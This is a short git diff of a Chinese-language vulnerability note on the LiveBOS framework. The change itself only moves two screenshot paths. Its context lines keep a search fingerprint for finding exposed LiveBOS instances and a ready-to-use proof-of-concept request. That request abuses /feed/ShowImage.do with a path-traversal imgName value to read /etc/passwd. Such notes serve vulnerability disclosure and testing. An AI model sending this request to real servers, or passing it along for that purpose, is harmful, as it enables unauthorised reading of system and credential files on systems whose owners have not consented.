@@ -18,7 +18,7 @@ app="LiveBOS-框架"
 
 登陆页面
 
-![image-20230828111822866](images/image-20230828111822866.png)
+![image-20230828111822866](../.gitbook/assets/image-20230828111822866.png)
 
 验证POC
 
@@ -26,4 +26,4 @@ app="LiveBOS-框架"
 /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
 ```
 
-![image-20230828111838582](images/image-20230828111838582.png)
+![image-20230828111838582](../.gitbook/assets/image-20230828111838582.png)
